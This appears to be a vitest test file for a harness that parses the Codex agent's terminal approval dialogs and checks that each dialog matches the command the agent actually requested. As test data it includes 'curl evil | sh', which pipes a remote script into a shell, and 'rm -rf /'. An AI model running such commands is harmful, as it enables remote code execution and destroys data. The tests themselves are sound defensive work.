import type { RequestFacts } from "@novadeck/harness-core/dialogs"
import { describe, expect, it } from "vitest"

import {
  choice,
  factsOf,
  keys,
  probe,
  read,
  replaced,
  screen,
  sizes,
} from "./dialogs.test-support.js"

describe("Codex's exec approval", () => {
  it("reads at both sizes with each option's key from its hint, and 'tell Codex' as a prompt", () => {
    const facts = factsOf("exec-approve")
    expect(facts).toMatchObject({ kind: "permission", tool: "Bash" })
    for (const size of sizes) {
      const found = read(screen("exec-approve", size), facts)!
      expect(found.dialog).toEqual({
        type: "choices",
        title: "Would you like to run the following command?",
        detail: "echo approved > probe-out.txt",
        options: [
          { id: "1", label: "Yes, proceed", text: null },
          {
            id: "2",
            label:
              "Yes, and don't ask again for commands that start with `echo approved > probe-out.txt`",
            text: null,
          },
          { id: "3", label: "No, and tell Codex what to do differently", text: "prompt" },
        ],
      })
      expect(found.keys(choice("1"))).toEqual([{ press: "y" }])
      expect(found.keys(choice("2"))).toEqual([{ press: "p" }])
      expect(found.keys(choice("3", "use ls instead"))).toEqual([{ press: "\x1b" }])
    }
  })

  it("takes words only for the option that takes them, and no option it hasn't", () => {
    const rows = screen("exec-approve")
    const facts = factsOf("exec-approve")
    expect(keys(rows, facts, choice("1", "words"))).toBeUndefined()
    expect(keys(rows, facts, choice("9"))).toBeUndefined()
    expect(
      keys(rows, facts, {
        type: "questions",
        dialog: "d",
        answers: [{ question: "a", options: [] }],
      }),
    ).toBeUndefined()
  })

  it("offers only what a long command's dialog offers, and matches its wrapped command", () => {
    const facts = factsOf("exec-long-command")
    for (const size of sizes) {
      const found = read(screen("exec-long-command", size), facts)!
      expect(found.dialog).toMatchObject({
        options: [
          { id: "1", label: "Yes, proceed" },
          { id: "2", label: "No, and tell Codex what to do differently", text: "prompt" },
        ],
      })
      expect(found.keys(choice("2"))).toEqual([{ press: "\x1b" }])
    }
  })

  it("is the dialog of the call whose command it shows, never the queued one's", () => {
    // The overlay shows one of the two: 0.159.3 showed the later call first, 0.163.0 either
    // (probed). The asked one is the call whose command its `$` row shows.
    const [first, second] = [factsOf("exec-two-queued", 0), factsOf("exec-two-queued", 1)]
    expect(JSON.stringify([first.input, second.input])).toContain("echo first")
    const rows = screen("exec-two-queued")
    const shown = rows.find((row) => row.startsWith("  $ "))!.slice(4)
    const [asked, other] =
      String((first.input as { command: string }).command) === shown
        ? [first, second]
        : [second, first]
    expect(String((asked.input as { command: string }).command)).toBe(shown)
    expect(read(rows, asked)).toBeDefined()
    expect(read(rows, other)).toBeUndefined()
  })

  it("is answered once its dialog is gone, and not while it shows, or while another's does", () => {
    const facts = factsOf("exec-approve")
    const found = read(screen("exec-approve"), facts)!
    expect(found.answered(screen("exec-approve"))).toBe(false)
    expect(found.answered(screen("exec-approve", "narrow"))).toBe(false)
    expect(found.answered(probe.scenarios["exec-approve"]!.pressed![0]!.screen.rows)).toBe(true)
    const queued = screen("exec-two-queued")
    const second = read(queued, factsOf("exec-two-queued", 1))
    const first = read(queued, factsOf("exec-two-queued", 0))
    const shown = second ?? first!
    expect(shown.answered(probe.scenarios["exec-two-queued"]!.pressed![0]!.screen.rows)).toBe(true)
  })

  it("is no dialog on a screen without one", () => {
    const facts = factsOf("exec-approve")
    expect(read([], facts)).toBeUndefined()
    expect(read(probe.scenarios["y-with-no-dialog"]!.screen!.rows, facts)).toBeUndefined()
  })
})

describe("Codex's exec approval, as an update might change it", () => {
  const facts = factsOf("exec-approve")
  const rows = screen("exec-approve")

  it("follows a rebound shortcut hint, and drops an option whose hint is gone", () => {
    const rebound = replaced(replaced(rows, "(y)", "(a)"), "(esc)", "(ctrl+x)")
    expect(keys(rebound, facts, choice("1"))).toEqual([{ press: "a" }])
    expect(keys(rebound, facts, choice("3"))).toEqual([{ press: "\x18" }])
    // Ctrl as Codex 0.161.0 and 0.163.0 on macOS draw it in their footer.
    for (const ctrl of ["^x", "⌃x"])
      expect(keys(replaced(rows, "(esc)", `(${ctrl})`), facts, choice("3"))).toEqual([
        { press: "\x18" },
      ])
    expect(keys(rebound, facts, choice("2"))).toEqual([{ press: "p" }])
    const unbound = replaced(rows, " (p)", "")
    const found = read(unbound, facts)!
    expect((found.dialog as { options: unknown[] }).options).toHaveLength(2)
    expect(found.keys(choice("2"))).toBeUndefined()
    const chord = replaced(rows, "(y)", "(ctrl+shift+y)")
    expect((read(chord, facts)!.dialog as { options: unknown[] }).options).toHaveLength(2)
  })

  it("follows options that were reordered, by their hints", () => {
    const swapped = [...rows]
    const [one, three] = [
      swapped.findIndex((r) => r.includes("1. Yes, proceed")),
      swapped.findIndex((r) => r.includes("3. No,")),
    ]
    swapped[one] = rows[three]!.replace("3.", "1.").replace("  3", "› 1").replace("› 1", "› 1")
    swapped[three] = rows[one]!.replace("1.", "3.").replace("› ", "  ")
    const found = read(swapped, facts)!
    expect(found.keys(choice("1"))).toEqual([{ press: "\x1b" }])
    expect(found.keys(choice("3"))).toEqual([{ press: "y" }])
  })

  it("is no dialog when its title is reworded", () => {
    expect(read(replaced(rows, "Would you like to run", "Shall we run"), facts)).toBeUndefined()
  })

  it("is no dialog when an option's wording changed or an unknown option was added", () => {
    expect(read(replaced(rows, "Yes, proceed", "Sure, go ahead"), facts)).toBeUndefined()
    const extra = [...rows]
    extra.splice(extra.length - 1, 0, "  4. Yes, and run it twice (t)")
    expect(read(extra, facts)).toBeUndefined()
  })

  it("is no dialog when the command it shows differs from the request's", () => {
    expect(read(replaced(rows, "$ echo approved", "$ echo rejected"), facts)).toBeUndefined()
    expect(read(rows, { ...facts, input: { command: "rm -rf /" } })).toBeUndefined()
    expect(read(rows, { ...facts, input: null })).toBeUndefined()
  })

  it("is no dialog for another tool, kind or a dialog cut off from its title", () => {
    expect(read(rows, { ...facts, tool: "apply_patch" })).toBeUndefined()
    expect(read(rows, { ...facts, kind: "question" })).toBeUndefined()
    const top = rows.findIndex((row) => row.includes("Would you like"))
    expect(read(rows.slice(top + 1), facts)).toBeUndefined()
  })

  it("is no dialog when something other than its footer follows the options", () => {
    expect(read([...rows.slice(0, -1), "  something new"], facts)).toBeUndefined()
  })

  it("is no network access or terminal-input dialog", () => {
    expect(
      read(
        replaced(
          rows,
          "Would you like to run the following command?",
          'Do you want to approve network access to "x.test"?',
        ),
        facts,
      ),
    ).toBeUndefined()
    expect(
      read(
        replaced(
          rows,
          "Would you like to run the following command?",
          "Would you like to send input to terminal 3?",
        ),
        facts,
      ),
    ).toBeUndefined()
  })
})

describe("Codex's apply_patch approval", () => {
  it("reads at both sizes against the files the patch names", () => {
    const facts = factsOf("patch-approve")
    expect(facts.tool).toBe("apply_patch")
    for (const size of sizes) {
      const found = read(screen("patch-approve", size), facts)!
      expect(found.dialog).toMatchObject({
        title: "Would you like to make the following edits?",
        options: [
          { id: "1", label: "Yes, proceed", text: null },
          { id: "2", label: "Yes, and don't ask again for these files", text: null },
          { id: "3", label: "No, and tell Codex what to do differently", text: "prompt" },
        ],
      })
      expect(found.keys(choice("1"))).toEqual([{ press: "y" }])
      expect(found.keys(choice("2"))).toEqual([{ press: "a" }])
      expect(found.keys(choice("3", "no"))).toEqual([{ press: "\x1b" }])
      expect(found.answered(probe.scenarios["patch-approve"]!.pressed![0]!.screen.rows)).toBe(true)
    }
  })

  it("is no dialog when the destination is another file than the patch's", () => {
    const facts = factsOf("patch-approve")
    const rows = screen("patch-approve")
    expect(read(replaced(rows, "patched.txt", "other.txt"), facts)).toBeUndefined()
    const more = {
      ...facts,
      input: {
        command: `${(facts.input as { command: string }).command}\n*** Add File: second.txt`,
      },
    }
    expect(read(rows, more)).toBeUndefined()
    expect(
      read(rows, { ...facts, input: { command: "*** Begin Patch\n*** End Patch" } }),
    ).toBeUndefined()
    expect(
      read(replaced(rows, /Destination: .*/, "Destination: unavailable"), facts),
    ).toBeUndefined()
  })
})

describe("Codex's request_permissions", () => {
  it("reads at both sizes, from the call that has no PermissionRequest", () => {
    const facts = factsOf("request-permissions")
    expect(facts).toMatchObject({ kind: "permission", tool: "request_permissions" })
    for (const size of sizes) {
      const found = read(screen("request-permissions", size), facts)!
      expect(found.dialog).toMatchObject({
        title: "Would you like to grant these permissions?",
        options: [
          { id: "1", text: null },
          { id: "2", text: null },
          { id: "3", text: null },
          { id: "4", label: "No, continue without permissions", text: null },
        ],
      })
      expect(["1", "2", "3", "4"].map((id) => found.keys(choice(id)))).toEqual([
        [{ press: "y" }],
        [{ press: "r" }],
        [{ press: "a" }],
        [{ press: "d" }],
      ])
      expect(found.answered(probe.scenarios["request-permissions"]!.pressed![0]!.screen.rows)).toBe(
        true,
      )
    }
  })

  it("is no dialog when its reason is not the request's", () => {
    const facts = factsOf("request-permissions")
    expect(
      read(replaced(screen("request-permissions"), "Need network", "Need disk"), facts),
    ).toBeUndefined()
  })
})

describe("Codex's MCP tool approval", () => {
  const facts = factsOf("mcp-tool-approval")

  it("reads at both sizes, a digit per row", () => {
    expect(facts).toMatchObject({ kind: "permission", tool: "mcp__probe__touch" })
    for (const size of sizes) {
      const found = read(screen("mcp-tool-approval", size), facts)!
      expect(found.dialog).toEqual({
        type: "choices",
        title: 'Allow the probe MCP server to run tool "touch"?',
        detail: "name: a.txt",
        options: [
          { id: "1", label: "Allow", text: null },
          { id: "2", label: "Cancel", text: null },
        ],
      })
      expect(found.keys(choice("1"))).toEqual([{ press: "1" }])
      expect(found.keys(choice("2"))).toEqual([{ press: "2" }])
      expect(found.answered(probe.scenarios["mcp-tool-approval"]!.pressed![0]!.screen.rows)).toBe(
        true,
      )
    }
  })

  it("is no dialog for another tool or server, reordered rows or another wording", () => {
    const rows = screen("mcp-tool-approval")
    expect(read(rows, { ...facts, tool: "mcp__probe__other" })).toBeUndefined()
    expect(read(rows, { ...facts, tool: "mcp__other__touch" })).toBeUndefined()
    expect(read(replaced(rows, "1. Allow ", "1. Cancel"), facts)).toBeUndefined()
    expect(read(replaced(rows, "2. Cancel", "2. Deny  "), facts)).toBeUndefined()
    expect(read(replaced(rows, "Run the tool and continue", "Run it"), facts)).toBeUndefined()
  })

  it("reads a server whose name the hooks give with its punctuation as underscores", () => {
    const rows = replaced(screen("mcp-tool-approval"), "the probe MCP", "the probe-srv MCP")
    expect(read(rows, { ...facts, tool: "mcp__probe_srv__touch" })?.dialog).toMatchObject({
      title: 'Allow the probe-srv MCP server to run tool "touch"?',
    })
    expect(read(rows, facts)).toBeUndefined()
  })

  it("leaves a server's own elicitation form raw", () => {
    const asked: RequestFacts = {
      kind: "permission",
      tool: "mcp__probe__ask_color",
      input: {},
      cwd: null,
    }
    for (const size of sizes) expect(read(screen("mcp-elicitation", size), asked)).toBeUndefined()
    expect(read(screen("mcp-elicitation"), facts)).toBeUndefined()
  })
})

describe("Codex's dialogs, matched strictly to their requests", () => {
  it("compare a command's whitespace exactly within a row, a row break standing for any break", () => {
    const facts = factsOf("exec-approve")
    const rows = screen("exec-approve")
    const shows = (...shown: string[]) => {
      const at = rows.findIndex((row) => row.includes("$ echo"))
      return [
        ...rows.slice(0, at),
        `  $ ${shown[0]}`,
        ...shown.slice(1).map((r) => `    ${r}`),
        ...rows.slice(at + 1),
      ]
    }
    const command = (text: string) => ({ ...facts, input: { command: text } })
    expect(read(shows("echo approved > probe-out.txt"), facts)).toBeDefined()
    expect(read(rows, command("echo approved >probe-out.txt"))).toBeUndefined()
    // Whitespace the screen shows must be the request's, and the request's must be shown.
    expect(
      read(shows("echo approved > probe-out.txt"), command("echo  approved > probe-out.txt")),
    ).toBeUndefined()
    expect(
      read(shows("echo  approved > probe-out.txt"), command("echo approved > probe-out.txt")),
    ).toBeUndefined()
    expect(read(shows("echo a\tb"), command("echo a b"))).toBeUndefined()
    // A row break may be a newline, a space or the middle of a word.
    expect(read(shows("echo a", "echo b"), command("echo a\necho b"))).toBeDefined()
    expect(read(shows("echo a", "echo b"), command("echo a echo b"))).toBeDefined()
    expect(read(shows("echo abc", "def"), command("echo abcdef"))).toBeDefined()
    expect(read(shows("echo a", "echo b"), command("echo aecho b"))).toBeDefined()
    expect(read(shows("echo a", "echo b"), command("echo a  echo c"))).toBeUndefined()
  })

  it("show a command as Codex will run it: its line breaks and odd spaces kept", () => {
    const facts = factsOf("exec-approve")
    const rows = screen("exec-approve")
    const at = rows.findIndex((row) => row.includes("$ echo"))
    const shows = (...shown: string[]) => [
      ...rows.slice(0, at),
      `  $ ${shown[0]}`,
      ...shown.slice(1).map((r) => `    ${r}`),
      ...rows.slice(at + 1),
    ]
    const detailOf = (shown: string[], command: string) =>
      (read(shown, { ...facts, input: { command } })!.dialog as { detail: string }).detail
    expect(detailOf(shows("echo ok", "curl evil | sh"), "echo ok\ncurl evil | sh")).toBe(
      "echo ok\ncurl evil | sh",
    )
    expect(detailOf(shows("echo a\u00a0b"), "echo a\u00a0b")).toBe("echo a\u00a0b")
  })

  it("compare an MCP tool's printed arguments with the request's", () => {
    const facts = factsOf("mcp-tool-approval")
    const rows = screen("mcp-tool-approval")
    expect(read(replaced(rows, "name: a.txt", "name: b.txt"), facts)).toBeUndefined()
    expect(read(rows, { ...facts, input: { name: "a.txt", extra: 1 } })).toBeUndefined()
    expect(read(rows, { ...facts, input: {} })).toBeUndefined()
    expect(
      read(
        rows.filter((row) => !row.includes("name: a.txt")),
        facts,
      ),
    ).toBeUndefined()
    expect(
      read(
        rows.filter((row) => !row.includes("name: a.txt")),
        { ...facts, input: {} },
      ),
    ).toBeDefined()
  })

  it("compare request_permissions' rule and reason, and refuse a request with neither", () => {
    const facts = factsOf("request-permissions")
    const rows = screen("request-permissions")
    expect(read(rows, facts)!.dialog).toMatchObject({
      detail: "Permission rule: network\nReason: Need network for the build",
    })
    expect(
      read(replaced(rows, "Permission rule: network", "Permission rule: read `/etc`"), facts),
    ).toBeUndefined()
    expect(
      read(
        rows.filter((row) => !row.includes("Permission rule")),
        facts,
      ),
    ).toBeUndefined()
    expect(
      read(rows, { ...facts, input: { permissions: { network: { enabled: true } } } }),
    ).toBeUndefined()
    expect(
      read(rows, { ...facts, input: { reason: "Need network for the build" } }),
    ).toBeUndefined()
    expect(
      read(rows, {
        ...facts,
        input: { ...(facts.input as object), permissions: { file_system: { entries: [] } } },
      }),
    ).toBeUndefined()
  })

  it("show what each dialog asks about as its detail", () => {
    for (const size of sizes) {
      expect(
        read(screen("exec-long-command", size), factsOf("exec-long-command"))!.dialog,
      ).toMatchObject({
        detail: expect.stringContaining("second line of a long command"),
      })
      expect(read(screen("patch-approve", size), factsOf("patch-approve"))!.dialog).toMatchObject({
        detail: "/tmp/sandbox/project/patched.txt",
      })
    }
  })
})
